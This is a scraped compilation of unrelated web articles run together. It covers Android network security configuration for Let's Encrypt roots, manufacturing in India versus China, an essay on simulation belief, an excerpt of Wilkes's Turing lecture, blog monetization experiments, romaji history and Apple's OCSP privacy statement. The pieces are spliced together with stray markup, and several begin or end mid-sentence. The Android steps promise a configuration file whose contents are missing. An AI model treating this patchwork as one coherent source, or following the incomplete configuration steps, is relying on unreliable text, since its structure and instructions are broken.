<p>Developers of Android apps can use <a href="https://developer.android.com/training/articles/security-config">Network Security Configuration</a> to enable their apps to be compatible with sites using Let’s Encrypt after January 21, 2021. </p>
<ol><li>Add <code>android:networkSecurityConfig="@xml/network_security_config"</code> as an attribute of the <code>&lt;application&gt;</code> tag in <code>AndroidManifest.xml</code>.</li><li>Create a <code>res/xml/network_security_config.xml</code> file with the following contents:</li></ol>

<ol start="3"><li>Download <a href="https://letsencrypt.org/certs/isrgrootx1.der">ISRG Root X1</a> and store it in <code>res/raw/isrg_root_x1.der</code></li><li>Download <a href="https://letsencrypt.org/certs/isrg-root-x2.der">ISRG Root X2</a> and store it in <code>res/raw/isrg_root_x2.der</code></li><li>If your app connects over cleartext in addition to TLS, change <code>cleartextTrafficPermitted</code> in the <code>network_security_config.xml</code> above to <code>true</code>.</li></ol>
<p>Instead of adding ISRG’s roots to the existing system root store, you may be considering replacing it entirely with an up-to-date root store such as <a href="https://wiki.mozilla.org/CA/Included_Certificates">Mozilla Firefox</a>‘s or <a href="https://www.chromium.org/Home/chromium-security/root-ca-policy">Google Chrome’s upcoming</a> <a href="https://g.co/chrome/root-store">root store</a>. Use caution — browser root store programs implement <a href="https://wiki.mozilla.org/CA/Additional_Trust_Changes">additional</a> <a href="https://www.chromium.org/Home/chromium-security/symantec-legacy-pki">controls</a> through custom certificate verification code which will not be implementable using a Network Security Configuration.</p>
<p>Notes:</p>
<ol><li>Network Security Configuration may only fully work with Android 7.0+. Fortunately for me, Android Nougat 7.0 is the oldest version of Android supported by the apps I’m actively involved in maintaining.</li><li>Let’s Encrypt’s blog post indicates a DST Root X3 expiration date of September 1, 2021 instead of September 30, 2021. This may indicate the last date for which a cross-signature has been arranged, or it may be due to an error.</li></ol>

Though the manufacturing sector now contributes only 16 percent to India’s gross domestic product (GDP), the “Make in India” initiative aims to boost that contribution to 25 percent by 2022.</span></p><p id="viewer-caorn"><span>And companies like Chinese smartphone maker OnePlus are investing heavily in R&amp;D in India. “Our success in India has proven to be a great model for our growth in other regions,” says OnePlus CEO Pete Lau. “…We are now closer to making India as our second headquarters.”</span></p><h2 id="viewer-6tjmf"><span>COST AND AVAILABILITY OF SKILLED LABOR IN INDIA AND CHINA</span></h2><p id="viewer-fp3rq"><span>Differences in manufacturing wages, size and skill level of the labor force should be at the forefront of your decision to move production from China to India. Depending on your product type, some of these factors may highlight clear advantages for remaining in China.</span></p><p id="viewer-6tdee"><span><strong>Manufacturing wages</strong></span></p><p id="viewer-7q1sj"><span>Labor represents one of the main costs of manufacturing goods. And importers have watched China’s labor costs soar in recent decades, often growing by 10-15 percent annually. China’s minimum wages, which now range from about US$140 to US$346 per month, are set at the provincial level.</span></p><p id="viewer-5u605"><span>India’s minimum wages similarly vary across states and range from about US$66 to US$202. Mounting U.S. tariffs on Chinese goods over the past year have only strengthened the case for India as a cost-effective manufacturing alternative. And importers of labor-intensive products, like garments and textiles, are in the best position to realize cost savings by moving to India.</span></p><p id="viewer-2dtbl"><span><strong>Labor force size and skill level</strong></span></p><p id="viewer-5d337"><span>Among the many manufacturing locations opposing China, India is unmatched in the size of its labor force. According to September 2019 data from the World Bank, India’s labor force numbers about 519 million. China’s labor force is still much larger with 783 million strong. But Indonesia’s labor force, with 134 million workers, is a distant third for the region.</span></p><p id="viewer-fh5j3"><span>India falls behind many of its neighbors with regard to factors the World Economic Forum use to rank countries in their human capital report. India ranks 103rd overall, while China ranks 34th.</span></p><p id="viewer-3umpt"><span>One area where India suffers a deficiency is in “know-how”, which includes the breadth and depth of specialized skills at work. We see this directly at play in the quality and complexity of the country’s top export products. This metric also measures employers’ perceived ease at filling job vacancies.</span></p><p id="viewer-8obvp"><span>India also has room to grow with regard to its labor development rank. This rank considers access to and enrollment in formal education, opportunities to upskill and how well the education system fits the needs of a competitive economy.</span></p><p id="viewer-6aqg0"><span>Some have attributed the low development rank to India’s shortage of vocational schools.</span></p><p id="viewer-crl8q"><span>The relatively low labor participation rate in India—just 67 percent among the 25-54 age group as of 2017—also hurt the country’s human capital rank. India’s employment gender gap, one of the world’s largest, was another major contributor. In contrast, China achieved a labor participation rate of 88 percent for the same age group.</span></p><p id="viewer-3r1pr"><span>On the positive side, India has performed relatively well in terms of quality of education, staff training and economic complexity.</span></p><p id="viewer-aa1e7"><span>Read further at <a href="https://www.intouch-quality.com/blog/manufacturing-in-india-vs-china" target="_blank" rel="noopener"><u>https://www.intouch-quality.com/blog/manufacturing-in-india-vs-china</u></a></span></p><p id="viewer-1hgbn"><span><em><strong>If you are looking forward to source high-quality metal jewelry then reach out to us at </strong></em><a href="mailto:info@aliajewelery.com" target="_blank" rel="noopener"><em><strong><u>info@aliajewelery.com</u></strong></em></a><em><strong> &amp; we'll provide you with a free quote as per your requirement.</strong></em></span></p></div></div></div></div></article></div></div>]]>

    <h3 id="are-we-living-in-a-simulation"><strong>Are we living in a simulation?</strong></h3>

<p>With the evident success of computer technologies 
this question raises more and more frequently.</p>

<p>Tech people mostly agree that this is a possible scenario, 
it could even be that we live in a multiple layers of simulations -
a simulation that runs in another simulation and so on.</p>

<p>While there is probably no way to disprove this hypothesis 
I argue that believing in such thing has a negative psychological effect 
on an individual and a society in general.</p>

<h3 id="what-do-we-mean-by-simulation"><strong>What do we mean by simulation?</strong></h3>

<p>In a process of simulation we are trying to model and imitate some real phenomena with the purpose of predicting or imposing the future outcomes. An imitation is generally much cheaper to perform than a real process. So we can trial a lot of different scenarios to find the best strategy before implementing it in reality.</p>

<p>It can be a computer modeling of a physical process or experiment. A repetition of some upcoming performance. Or even a thought process when we try to imagine a tree of possible events and our possible responses.</p>

<p>Virtual reality or a computer game also can be considered as a simulation since we model some elements of our real world (with some fictional elements, though) in a controllable and cheaper environment.</p>

<p>In general, all simulations are irrelevant when the best strategy is found.</p>

<p>But observe that in any case simulation is still part of the reality. Every completed game, no matter how useless it was, is still part of our world. And due to the butterfly effect every tiny event can have a huge impact in the future.</p>

<p>So, a simulation is always real, even if it predates the <em>real action</em>. It’s just way less important.</p>

<h3 id="why-would-we-prefer-to-think-that-we-live-in-a-less-important-world"><strong>Why would we prefer to think that we live in a less important world?</strong></h3>

<p>The simple answer is — people tend to downgrade what they see if they don’t like that. An irresponsible and childish person became a president of a powerful country? A girl has to tell to world leaders what to do with the Earth’s climate? No, this doesn’t imply that we live in some kind of game, or a part of a show. There are explanations and they are real. We just don’t know or understand them.</p>

<p>Another reason could be that the world became so big and interconnected that we feel ourselves in much less control. There are too many information, too many factors, too many actors. Also the pace of change is not making us more certain about the future. The world is less predictable than ever today.</p>

<p>Finally, downgrading reality is a psychological way to flee from our responsibilities in life. Why bother to do something if everything is not important?</p>

<h3 id="the-effects-of-such-belief"><strong>The effects of such belief</strong></h3>

<p>Believing that the world is just a simulation implies that we, our feelings and our actions are not that important either.</p>

<p>The is a huge amplifier of depression if a person has already lost their sense and purpose in life. Or this could be an excuse to live a meaningless life.</p>

<p>Now imagine that you live in a society that think the world around is not that important, including you, obviously. 
You could be an NPC (non-player character) in this game, after all. Just an AI script written by a programmer from the <em>true world</em>. Would you like to live in such community?</p>

<h3 id="conclusions"><strong>Conclusions</strong></h3>

<p>Do not downgrade <em>the reality</em> of what you see simply because you don’t like it, don’t understand or don’t control it. All your actions, your feelings, your views and your life in general are <em>matter</em>, as well as the life of others.</p>

  <section>
    <p>This is the 1967 Turing award lecture by Maurice V. Wilkes. From <a href="https://en.wikipedia.org/wiki/Turing_Award">Wikipedia</a>, Wilkes is best known as the builder and designer of the EDSAC, the first computer with an internally stored program. This lecture does a wide survey of computer as they were in 1968 and makes many accurate predictions. Yellow highlights/annotations are my own. <a onclick="disableHighlight()" href="#">You can disable them.</a></p>

<h2 id="abstract">Abstract</h2>

<p>Reminiscences on the early developments leading to large scale electronic
computers show that it took much longer than was expected for the first of
the more ambitious and fully engineered computers to be completed and prove
themselves in practical operation. Comments on the present computer field
assess the needs for future development.</p>

<p>I do not imagine that many of the Turing lecturers who will follow me will
be people who were acquainted with Alan Turing. The work on computable
numbers, for which he is famous, was published in 1936 before digital
computers existed. Later he became one of the first of a distinguished
succession of able mathematicians who have made contributions to the
computer field. He was a colorful figure in the early days of digital
computer development in England, and I would find it difficult to speak of
that period without making some references to him.</p>

<h2 id="pioneering-days">Pioneering Days</h2>

<p>An event of first importance in my life occurred in 1946, when I received a
telegram inviting me to attend in the late summer of that year a course on
computers at the Moore School of Electrical Engineering in Philadelphia. I
was able to attend the latter part of the course, and a wonderful experience
it was. No such course had ever been held before, and the achievements of
the Moore School, and other computer pioneers, were known to few. There were
28 students from 20 organizations. The principal instructors were John
Mauchly and Prosper Eckert. They were fresh from their triumph as designers
of the ENIAC, which was the first electronic digital computer, although it
did not work on the stored program principle. The scale of this machine
would be impressive even today  – it ran to over 18,000 vacuum tubes.
Although the ENIAC was very successful – and very fast  – for the
computation of ballistic tables, which was the application for which the
project was negotiated, it had severe limitations which greatly restricted
its application as a general purpose computing device. In the first place,
the program was set up by means of plugs and sockets and switches, and it
took a long time to change from one problem to another. In the second place,
it had internal storage capacity for 20 numbers only. Eckert and Mauchly
appreciated that the main problem was one of storage, and they proposed for
future machines the use of ultrasonic delay lines. Instructions and numbers
would be mixed in the same memory in the way to which we are now accustomed.
Once the new principles were enunciated, it was seen that computers of
greater power than the ENIAC could be built with one tenth the amount of
equipment.</p>

<p>Von Neumann was, at that time, associated with the Moore School group in a
consultative capacity, although I did not personally become acquainted with
him until somewhat later. The computing field owes a very great debt to yon
Neumann. He appreciated at once the possibilities of what became known as
logical design, and the potentialities implicit in the stored program
principle. That von Neumann should bring his great prestige and influence to
bear was important, since the new ideas were too revolutionary for some, and
powerful voices were being raised to say that the ultrasonic memory would
not be reliable enough, and that to mix instructions and numbers in the same
memory was going against nature.</p>

<p>Subsequent developments have provided a decisive vindication of the
principles taught by Eckert and Mauchly in 1946 to those of us who were
fortunate enough to be in the course. There was, however, a difficult period
in the early 1950s. The first operating stored-program computers were,
naturally enough, laboratory models; they were not fully engineered and they
by no means exploited the full capability of the technology of the time. <mark>It
took much longer than people had expected for the first of the more
ambitious and fully engineered computers to be completed and prove
themselves in practical operation.</mark> In retrospect, the period seems a short
one; at the time, it was a period of much heart searching and even
recrimination.</p>

<p>I have often felt during the past year that we are going through a very
similar phase in relation to time sharing. This is a development carrying
with it many far-reaching implications concerning the relationship of
computers to individual users and to communities, and one that has stirred
many people’s imaginations. It is now several years since the pioneering
systems were demonstrated. Once again, it is taking longer than people
expected to pass from experimental systems to highly developed ones that
fully exploit the technology that we have available. The result is a period
of uncertainty and questioning that closely resembles the earlier period to
which I referred. When it is all over, it will not take us long to forget
the trials and tribulations that we are now going through.</p>

<p>In ultrasonic memories, it was customary to store up to 32 words end to end
in the same delay line. The pulse rate was fairly high, but people were much
worried about the time spent in waiting for the right word to come around.
Most delay line computers were, therefore, designed so that, with the
exercise of cunning, the programmer could place his instructions and numbers
in the memory in such a way that the waiting time was minimized. Turing
himself was a pioneer in this type of logical design. Similar methods were
later applied to computers which used a magnetic drum as their memory and,
altogether, the subject of optimum coding, as it was called, was a
flourishing one. I felt that this kind of human ingenuity was misplaced as a
long-term investment, since sooner or later we would have truly
random-access memories. We therefore did not have anything to do with
optimum coding in Cambridge.</p>

<p>Although a mathematician, Turing took quite an interest in the engineering
side of computer design. There was some discussion in 1947 as to whether a
cheaper substance than mercury could not be found for use as an ultrasonic
delay medium. Turing’s contribution to this discussion was to advocate the
use of gin, which he said contained alcohol and water in just the right
proportions to give a zero temperature coefficient of propagation velocity
at room temperature.</p>

<p>A source of strength in the early days was that groups in various parts of
the world were prepared to construct experimental computers without
necessarily intending them to be the prototype for serial production. As a
result, there became available a body of knowledge about what would work and
what would not work, about what it was profitable to do and what it was not
profitable to do. While, looking around at the computers commercially
available today, one cannot feel that all the lessons were learned, there is
no doubt that this diversity of research in the early days has paid good
dividends. It is, I think, important that we should have similar diversity
today when we are learning how to construct large, multiple-access,
multi-programmed, multi-processor computer systems. <mark>Instead of putting
together components and vacuum tubes to make a computer, we have now to
learn how to put together memory modules, processors, and peripheral devices
to make a system</mark>.<label for="sn-1"></label>
<span>
S: What we now call as <em>computer architecture</em>.
</span>
I hope that money will be available to finance the
construction of large systems intended for research only.</p>

<p>Much of the early engineering development of digital computers was done in
universities. A few years ago, the view was commonly expressed that
universities had played their part in computer design, and that the matter
could now safely be left to industry. I do not think that it is necessary
that work on computer design should go on in all universities, but I am glad
that some have remained active in the field. Apart from the obvious
functions of universities in spreading knowledge, and keeping in the public
domain material that might otherwise be hidden, universities can make a
special contribution by reason of their freedom from commercial
considerations, including freedom from the need to follow the fashion.</p>

<h2 id="good-language-and-bad">Good Language and Bad</h2>

<p><mark>Gradually, controversies about the design of computers themselves died down
and we all began to argue about the merits or demerits of sophisticated
programming techniques; the battle for automatic programming or, as we
should now say, for the use of higher level programming languages, had
begun.</mark> I well remember taking part at one of the early ACM meetings – it
must have been about 1953 – in a debate on this subject. John Carr was also
a speaker and he distinguished two groups of programmers; the first
comprised the “primitives,” who believed that, all instructions should be
written in octal, hexadecimal, or some similar form, and who had no time for
what they called fancy schemes, while the second comprised the “space
cadets,” who saw themselves as the pioneers of a new age. I hastened to
enroll myself as a space cadet, although I remember issuing a warning
against relying on interpretive systems, for which there was then something
of a vogue, rather than on compilers. (I do not think that the term compiler
was then in general use, although it had in fact been introduced by Grace
Hopper.)</p>

<p>The serious arguments advanced against automatic programming had to do with
efficiency. <mark>Not only was the running time of a compiled program longer than
that of a hand-coded program, but, what was then more serious, it needed
more memory.</mark> In …</p></section></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This blog has never been a money-making endeavor. I’ve had a series of jobs in software engineering and leadership that have paid my rent since 2009. Nevertheless, it’s interesting to tinker with ways how this blog could pay for its own domain name renewal fees.</p><h3 id="itunes--amazon-2016-2018">iTunes &amp; Amazon (2016-2018)</h3><p>For a few years, I had affiliate links on the site, for iTunes and Amazon links. The <a href="https://appleservices-console.partnerize.com/login/appleservices/en_us">Apple partner program</a> is relatively unknown but was pretty easy to use. Sticking <code>&amp;at=1010lmEW</code> at the end of links to the iTunes store tagged them with your website as an origin, and they give some low percentage of application and music sales. In the time I used it, the total was around $30.</p><p>Amazon Affiliates is the most famous program of its type on the internet. For a while, whenever I linked to Amazon, I’d use those links. It yielded slightly more than iTunes, in total around $60 over the course of three years, or $20 a year.</p><p>I removed all of these links in 2018. Disclosing that <em>this site uses affiliate links</em> on the About page felt a little grimy, and the idea that I might be linking to something just to earn a buck – though it was never true – felt like something to be entirely avoided. Plus, linking to Amazon meant enriching a company that’s <a href="https://www.revealnews.org/article/the-truth-about-injuries-at-amazon/">really</a>, <a href="https://themarkup.org/2020/07/30/congressional-antitrust-tech-hearing-recap-facebook-amazon-alphabet-google-apple">really</a>, not on the right side of history.</p><h3 id="brave">Brave</h3><p>I set up this site with <a href="https://brave.com/">Brave</a>’s rewards system in mid-2019. Brave, the browser, has a pretty complicated ecosystem around it: a <a href="https://basicattentiontoken.org/">cryptocurrency, BAT</a>, a <a href="https://publishers.basicattentiontoken.org/">publisher-side interface</a>, and a bunch of details that they’re lining up to eventually have the Brave browser itself serve ads on webpages that allow it.</p><p>Setting up a site with Brave Publishers involves a text file <a href="https://macwright.com/.well-known/brave-rewards-verification.txt"><code>brave-rewards-verification.txt</code></a>, to link your account with your website, and then setting up an account on <a href="https://uphold.com/">Uphold</a>, a sort of cryptocurrency wallet, to convert your money to USD, some other sort of cryptocurrency, or, in the rarest case, use it to buy something with crypto.</p><p><img alt="Brave Rewards" src="https://macwright.com/images/2020-11-15-mini-monetization-experiments-brave-rewards.png"></p><p>All-in-all, this site has earned 162 BAT, which, at $0.19 each, is about $30. <del>The reason <em>why</em> it makes any money from Brave is a total mystery to me. Sure, someone directly tipped 9.5 BAT, or about $2, but where did the rest come from? I didn’t use affiliate links to encourage people to use the Brave browser - I don’t use it myself at all, it seems fine though. The thing where Brave shows ads on webpages isn’t launched yet, as far as I can tell. It’s cool that money appeared somewhere, but it’s hard to say why.</del></p><p><a href="https://mostlysubjective.com/about/">Atanas Entchev</a> explains that Brave opens ads in separate tabs, which is where the ad revenue is coming from, and then those collected BAT tokens are distributed to sites like this one. Thanks!</p><h3 id="coil">Coil</h3><p>More recently, I set up <a href="https://coil.com/about">Coil</a> on this site. Like Brave, it requires you to sort of ‘confirm’ that you own the website and link it to your site. To do that, you get a sort of special code from Uphold and put that in a meta tag on the page:</p><div><div><pre><code><span>&lt;meta</span>
  <span>name=</span><span>"monetization"</span>
  <span>content=</span><span>"$ilp.uphold.com/Kk2HbEYgFH6K"</span><span>&gt;</span>
</code></pre></div></div><p>Coil’s a very interesting sign of the times: a blockchain-powered technology behind a startup that is apparently trying hard to never mention blockchains or crypto. To me at least, that seems wise. The culture and thought around crypto and blockchains have been poisoned by scammers, techno-liberatarians, and all sorts of baddies.</p><p>I think the economics around Coil are a lot more straightforward than Brave: people install a browser extension or use the Puma Browser, and they pay $5 a month to fund websites that support it. It’s much newer and less popular than Brave, and as a result, so far…&nbsp;it earns about $0.04 a week.</p><h3 id="ko-fi">Ko-fi</h3><p>Finally, I’ve had a <a href="https://ko-fi.com/">Ko-fi</a> link up on the /about page for a while. It’s been nice, and is the simplest and most straightforward sort of option: every once in a while, someone enjoys an article and sends a few dollars my way.</p><p>I think that it’s a nicer fit for someone like me who doesn’t have a fixed topic or schedule. I write just when I feel strongly about something, or have something I think is interesting to share.

November 15, 2020 | https://www.dampfkraft.com/romaji-history.html | <a href="https://web.archive.org/web/*/https://www.dampfkraft.com/romaji-history.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently created a tool called <a href="https://github.com/polm/cutlet">cutlet</a> for converting Japanese to romaji.
While working on cutlet I was surprised at the difficulty of finding a good
guide to the difference between romaji systems, particularly their history and
usage, so I wrote this up.</p>
<h2 id="a-romaji-refresher"> A Romaji Refresher</h2>
<p>There are three relatively well-defined romaji systems. For a quick overview of
some of their differences:</p>
<table>
<thead>
<tr>
<th>Japanese</th>
<th>新橋</th>
<th>お茶漬け</th>
<th>富士山</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hepburn</td>
<td>Shinbashi (or Shimbashi)</td>
<td>ochazuke</td>
<td>Fujisan</td>
</tr>
<tr>
<td>Kunreisiki</td>
<td>Sinbasi</td>
<td>otyazuke</td>
<td>Huzisan</td>
</tr>
<tr>
<td>Nipponsiki</td>
<td>Sinbasi</td>
<td>otyaduke</td>
<td>Huzisan</td>
</tr>
</tbody>
</table>
<p>Hepburn is the most widely used outside Japan, Kunreisiki is officially taught
to children in Japan. Nipponsiki is similar to Kunreisiki but older. Technically
Hepburn uses macrons for long vowels while Kunreisiki and Nipponsiki use
circumflexes, but usage isn't consistent and there's no difference in meaning
between them.</p>
<p>In recent years "wapuro" romaji, based on input when typing Japanese, are also
relatively common, but it's not systematized (except in as far as programs
either take or don't take certain sequences) and isn't used in any kind of
formal writing.</p>
<h2 id="particle-comparison"> Particle Comparison</h2>
<p>As another refresher, here's how non-phonetic particles are represented in the
various systems.</p>
<table>
<thead>
<tr>
<th>Japanese</th>
<th>は</th>
<th>を</th>
<th>へ</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hepburn</td>
<td>wa</td>
<td>wo</td>
<td>e</td>
</tr>
<tr>
<td>Kunreisiki</td>
<td>wa</td>
<td>o</td>
<td>e</td>
</tr>
<tr>
<td>Nipponsiki</td>
<td>ha</td>
<td>wo</td>
<td>he</td>
</tr>
</tbody>
</table>
<p>Hepburn is phonetic except for <em>wo</em>, Kunreisiki is strictly phonetic, and
Nipponsiki is strictly orthographic.</p>
<h2 id="early-romaji"> Early Romaji</h2>
<p>Japanese was first written in the Latin alphabet in the 1600s, mainly by
Christian missionaries. It was used by the missionaries for recording and
learning the language, and also used in texts they produced to try to spread
Christianity. Since Christianity was later supressed in Japan, these forms of
romaji never had wide adoption, though they influenced later efforts.</p>
<h2 id="the-origins-of-the-hepburn-system"> The Origins of the Hepburn System</h2>
<p>In 1867, missionary <a href="https://en.wikipedia.org/wiki/James_Curtis_Hepburn#Missionary_work_in_Japan">James Curtis Hepburn</a> published a
Japanese-English dictionary in Yokohama. Naturally he needed some way to write
Japanese words for people who couldn't read Japanese, so he devised a system of
representing Japanese that reflected the pronunciation of English consonants.
His system wasn't designed from the ground up, but developed based on his
knowledge of existing systems by other missionaries as well as his own
knowledge of Japanese.</p>
<p>Somewhat later, in 1885, an organization known as the
<a href="https://ja.wikipedia.org/wiki/%E3%83%AD%E3%83%BC%E3%83%9E%E5%AD%97%E8%AB%96#%E3%83%AD%E3%83%BC%E3%83%9E%E5%AD%97%E4%BC%9A">羅馬字会</a>
(Romajikai) was established. Mainly a society of Japanese academics, it was
interested in promoting the use of romaji as a replacement for kana and kanji.
Some motivations for getting rid of native writing systems included easier
international communication and improved domestic literacy. The principle
founders were <a href="https://en.wikipedia.org/wiki/Ry%C5%8Dkichi_Yatabe">Ryoukichi Yatabe</a>, a botanist and the first Japanese graduate of Cornell, and <a href="https://ja.wikipedia.org/wiki/%E5%A4%96%E5%B1%B1%E6%AD%A3%E4%B8%80">Masakazu Toyama</a>, a <a href="https://ii.umich.edu/cjs/history-of-cjs.html">graduate of the University of Michigan</a> who
later occupied a high post at what would eventually become Tokyo University.</p>
<figure><a href="https://www.dampfkraft.com/by-id/4d041d6a/max-moritz-romaji.jpg"><img src="https://www.dampfkraft.com/by-id/4d041d6a/img/max-moritz-romaji.jpg.l.jpg"></a><figcaption>The Romajikai published books to promote romaji, including this translation of Max and Moritz, titled "Wampaku Monogatari". This edition was reprinted in 1978. via <a href="https://www.wul.waseda.ac.jp/kotenseki/html/he22/he22_07214/index.html">Waseda University</a>
</figcaption></figure>
<p>In 1886 the Romajikai published <a href="https://dl.ndl.go.jp/info:ndljp/pid/862485">a romaji system</a>. Also in 1886
Hepburn published the third edition of his dictionary, which roughly used the
system.  I've had trouble finding the exact nature of the influence between
Hepburn's system and the Romajikai, but they were on friendly terms and
cooperating. Hepburn's dictionary's third edition took off, the romaji system
mainly came to be called by his name, and it became widely established,
particularly among foreigners dealing with Japan.</p>
<p>If you're interested in learning more about Hepburn's dictionaries, a <a href="http://www.meijigakuin.ac.jp/mgda/waei/">wealth
of information</a> is available via Meiji Gakuin University
Library, including a comparison of romaji in all published versions and
manuscripts.</p>
<h2 id="the-origins-of-the-nipponsiki-system"> The Origins of the Nipponsiki System</h2>
<p>Around the time the Romajikai was established, one of the members, <a href="https://en.wikipedia.org/wiki/Tanakadate_Aikitsu">Aikitu
Tanakadate</a>, developed his
own romaji system, based on some existing informal conventions, that was
specifically designed to mirror the structure of Japanese kana without regard
to foreign pronunciation.</p>
<p>In 1885 Tanakadate proposed this new system to the Romajikai, but they
ultimately rejected his proposal in favor of keeping Hepburn. As a result
Tanakadate left the Romajikai and promoted Nipponsiki on his own. Before
becoming known as "Nipponsiki" this style of Romanization was known as
"Tanakadatesiki".</p>
<p>The disagreement between Tanakadate was only the first in a long series of
arguments between Hepburn and Nipponsiki proponents.</p>
<p>Tanakadate was around 30 when he invented this system, and most of his later
career was in physics. He worked with Lord Kelvin in Scotland and helped bring
about the adoption of the metric system in Japan. He used romaji in personal
writings and promoted it throughout his life. We'll be seeing him again later.</p>
<h2 id="standard-form-and-the-romaji-hirome-kai"> Standard Form and the Romaji Hirome Kai</h2>
<p>In 1905 the ローマ字ひろめ会 (Romaji Hirome Kai, "Society for the Advancement
of Romaji") was established. They published a magazine, called simply "Rômaji",
to create more reading material in romaji and spread its use within Japan.  By
this point Toyama and Yatabe had both passed away, and it's unclear if the
original Romajikai still existed in any capacity. An important early member of
the new society was <a href="https://ja.wikipedia.org/wiki/%E8%97%A4%E5%B2%A1%E5%8B%9D%E4%BA%8C">Katsuji Fujioka</a>, who wrote the
<a href="https://dl.ndl.go.jp/info:ndljp/pid/942994">羅馬字手引</a> (Romaji Tebiki), a kind of romaji dictionary.</p>
<p>Shortly after it was founded the Romaji Hirome Kai proposed a slightly modified
Hepburn and called it 標準式, or "Standard Form". Note that this is "Standard
Form" in general, not "Standard Hepburn", suggesting this was some kind of
official standard romanization system; this may have been a response to
Tanakadatesiki becoming known as "Nipponsiki", which could imply that other
romaji systems were "foreign". As we'll see in a bit, this rhetorical trick
ultimately didn't help official adoption.</p>
<p>I haven't been able to track down the original document with Standard Form, but
the Romaji Tebiki was already using it in 1906.</p>
<p>Standard Form replaced macrons with circumflexes and always romanized ん as
"n", rather than sometimes using "m" depending on the following consonant.</p>
<p>Tanakadate was still around and joined the Romaji Hirome Kai at some point, but
got fed up with their use of Hepburn, left, and founded his own organization in
1914.</p>
<h2 id="the-origins-of-kunreisiki"> The Origins of Kunreisiki</h2>
<p>In 1930 the government formed a committee to evaluate various romaji systems
for official government use. At this point Tanakadate was a member of the
<a href="https://en.wikipedia.org/wiki/House_of_Peers_(Japan)">House of Peers</a>, and Romaji Hirome Kai member and Hepburn proponent
Fujioka was not a politician, but had political influence due to his long and
prominent career as a linguist. Both were involved with the government
committee.</p>
<p>While the system used at this point varied considerably by government agency,
Hepburn was more popular, so it seemed slated for official adoption.  However,
in 1935 Fujioka died of illness. In 1937, following a recommendation from the
committee, a slightly modified version of Tanakadate's Nipponsiki, dubbed
Kunreisiki, was established as the official government romaji system.</p>
<p>The main difference between Kunreisiki and Nipponsiki is that kana that are not
pronounced differently in standard modern Japanese are spelled as their more
common counterpart (づ and ず are both <em>zu</em>), though there are other
differences, like how particles are represented, and how ambiguous phonetic
boundaries are written.</p>
<h2 id="the-war"> The War</h2>
<p>Despite the recent official adoption of a government-approved romaji system,
around 1938 a number of more radical romaji proponents were arrested as
potential (or actual) anti-nationalists. One example was Esperantist and
language researcher <a href="https://ja.wikipedia.org/wiki/%E6%96%8E%E8%97%A4%E7%A7%80%E4%B8%80">Hidekatsu Saitou</a>, who contracted tuberculosis in
prison and died in 1940.</p>
<p>Following World War 2, the occupying American forces rescinded the law making
Kunreisiki official and ordered the use of Hepburn for public signage and
documents. During the occupation, an American educational commission
<a href="https://babel.hathitrust.org/cgi/pt?id=pur1.32754081234191&amp;view=1up&amp;seq=28">recommended native Japanese writing be replaced with romaji</a>.
This never happened, though romaji became a standard component of post-war
education.</p>
<p>Post-war the development of romaji became less dramatic, as serious proponents
of replacing Japanese writing systems with romaji mostly disappeared. There
have been a number of laws and rules issued by the government over the years,
as well as a few special systems like the <a href="https://en.wikipedia.org/wiki/JSL_romanization">unique system</a> developed for a
textbook called "Japanese: The Spoken Language", but Hepburn and
Nipponsiki/Kunreisiki remain the major systems.</p>
<p>There is also much to be written about interaction of romaji with computers,
but that's best left for another time.</p>
<h2 id="what-about-revised-hepburn%3F"> What About Revised Hepburn?</h2>
<p>Sometimes you'll see references to "Revised Hepburn", but nobody knows what
this is. It is used to mean, variously:</p>
<ul>
<li>Hepburn's system in his third edition, in contrast to earlier editions</li>
<li>the 1905 version by the ローマ字ひろめ会 (properly 標準式 or "standard form")</li>
<li>a version introduced with Kenkyuusha's "New Japanese-English Dictionary" in 1954, subsequently <a href="https://www.loc.gov/catdir/cpso/romanization/japanese.pdf">adopted by the American Library of Congress</a></li>
<li>other minor variants proposed at different times</li>
</ul>
<p>While the Library of Congress is surely consistent in their romaji usage, their
choice of a particular 1954 dictionary is a bit odd, and distinguishing it from
the similar 1905 system is a source of confusion. At one point it seemed like
Hepburn might become an ANSI standard, but instead Kunreisiki was adopted, and
that standard (Z39.11-1972) has since been deprecated. This lack of an official
standard contributes to inconsistency in what "Revised Hepburn" means.</p>
<p>In contrast, "traditional Hepburn" is somewhat reliably used to refer to the
system used in Hepburn's third edition as opposed to later forms.</p>
<p>Another common variant, "passport Hepburn" refers to the system previously
mandated for names on Japanese passports, which included some exceptions to
normal Hepburn, but those requirements are <a href="https://www.mofa.go.jp/mofaj/toko/passport/pass_4.html#q17">no longer strictly in force</a>,
and you can use any romanization you want (such as "George" for what would be
"Jouji" in Hepburn) if you have …</p></div></div>

<p><a href="https://www.iphoneincanada.ca/news/privacy-concerns-emerge-following-apple-ocsp-server-outage/">Following privacy concerns from Mac users after Apple’s Online Certificate Status Protocol (OCSP) server went down, </a>thus causing third-party applications unable to open on Macs, Apple has now responded to the situation,&nbsp; exacerbated by a recent blog post by Jeffrey Paul.</p>	
	
	
	
<p>An Apple spokesperson told<em> iPhone in Canada</em> it had updated its support document, ‘Safely open apps on your Mac’, to now further detail its privacy protections.</p>
<p>“Gatekeeper performs online checks to verify if an app contains known malware and whether the developer’s signing certificate is revoked,” <a href="https://support.apple.com/en-us/HT202491">explains</a> Apple. “We have never&nbsp;combined data from these checks with information about Apple users or their devices. We do not use data from these checks to learn what individual users are&nbsp;launching or running on their devices,” clarified the company.</p>
<p>“Notarization checks if the app contains known malware using an encrypted connection that is resilient to server failures,” says Apple, further emphasizing, “These security checks have never included the user’s Apple ID or the identity of their device. To further protect privacy, we have stopped logging IP addresses&nbsp;associated with Developer ID certificate checks, and we will ensure that any collected IP addresses are removed from logs,” details Apple.</p>
<p>On top of this, Apple says “over the next year we will introduce several changes to our security checks,” specifically:</p>
<ul>
<li>a new encrypted protocol for Developer ID certificate revocation checks</li>
<li>strong protections against server failure</li>
<li>a new preference for users to opt out of these security protections</li>
</ul>
<p>Apple also gave some further technical information on the situation to <em>iPhone in Canada.</em> Certificate revocation checks occur to verify that Developer ID certificates used to sign an app have not been revoked by the company. The move is critical for security since a certificate may be pulled if a developer suspects it has been compromised by third parties, or is being used to sign malicious apps.</p>
